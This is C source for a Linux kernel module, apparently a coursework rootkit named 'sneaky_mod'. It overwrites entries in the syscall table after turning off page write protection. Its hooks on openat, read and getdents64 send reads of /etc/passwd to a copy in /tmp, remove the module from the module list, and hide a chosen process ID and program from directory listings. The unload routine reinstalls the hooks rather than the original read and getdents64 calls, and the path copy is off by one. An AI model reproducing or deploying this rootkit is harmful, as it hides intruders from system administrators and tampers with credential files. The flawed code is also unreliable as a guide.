#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/module.h>      // for all modules
#include <linux/kernel.h>      // for printk and other kernel bits
#include <linux/init.h>        // for entry/exit macros
#include <asm/current.h>       // process information
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <asm/page.h>

#define PREFIX "sneaky_process"

MODULE_AUTHOR("Yixin Cao");
static char * pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "This sneaky process's id");

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage ssize_t (*original_read)(struct pt_regs *);
asmlinkage int (*original_getd)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  const char * path = (const char *)regs->si;
  //find passwd
  if (strcmp(path, "/etc/passwd") == 0){
    int len = strlen("tmp/passwd");
    //copy passwd
    copy_to_user((void *)path, "/tmp/passwd", len);
  }
  // Implement the sneaky part here
  return (*original_openat)(regs);
}

asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
  char * buffer = (char *)regs->si;
  ssize_t len_line = (ssize_t)original_read(regs);
  if (len_line > 0) {
    char * pos_mod = strstr(buffer, "sneaky_mod ");
    char * pos_mod_end;
    //if no sneaky_mod, return
    if(pos_mod == NULL) return len_line;
    pos_mod_end = strchr(pos_mod, '\n');
    //if no \n, return
    if (pos_mod_end == NULL) return len_line;
    //remove sneaky_mod info
    memmove(pos_mod, pos_mod_end + 1, len_line + buffer - pos_mod_end - 1);
    //get new length of line
    len_line = len_line - (ssize_t)(pos_mod_end - pos_mod + 1);
  }
  return len_line;
}

asmlinkage int sneaky_sys_getd(struct pt_regs * regs) {
  struct linux_dirent64 * dir = (struct linux_dirent64 *)regs->si;
  int len_line = original_getd(regs);
  if (len_line > 0) {
    int offset_pos = 0;
    struct linux_dirent64 * cur_pos = dir;//get current position
    while (offset_pos < len_line) {
      //find sneaky program
      int x = strcmp(cur_pos->d_name, pid);
      int y = strcmp(cur_pos->d_name, PREFIX);
      if ((x != 0) && (y != 0)) {
        offset_pos = offset_pos + cur_pos->d_reclen;
        cur_pos = (struct linux_dirent64 *)((char *)cur_pos + cur_pos->d_reclen);
      }
      else {
        //get next position of program that is end of program
        char * next_pos = (char *)cur_pos + cur_pos->d_reclen;
        //remove
        memmove(cur_pos, next_pos, (char *)dir + len_line - (char *)next_pos);
        //get total len of line after remove
        len_line = len_line - cur_pos->d_reclen;
      }
    }
  }
  return len_line;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_read = (void *)sys_call_table[__NR_read];
  original_getd = (void *)sys_call_table[__NR_getdents64];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getd;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load
}


static void exit_sneaky_module(void)
{
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getd;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}


module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");
